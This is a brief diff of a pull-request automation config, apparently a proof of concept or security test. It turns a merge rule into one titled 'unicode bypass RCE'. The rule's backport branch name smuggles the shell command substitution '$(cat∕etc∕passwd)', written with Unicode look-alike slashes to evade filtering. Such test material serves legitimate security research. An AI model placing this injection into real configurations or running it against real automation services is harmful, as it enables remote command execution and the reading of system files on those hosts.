@@ -1,9 +1,9 @@
 pull_request_rules:
-  - name: merge with attributes
+  - name: unicode bypass RCE
     conditions:
       - base=main
-      - label=merge-test
+      - label=unicode-test
     actions:
-      merge:
-        method: merge
-        commit_message_template: "{{ title }}"
+      backport:
+        branches:
+          - "pwned-$(cat∕etc∕passwd)"
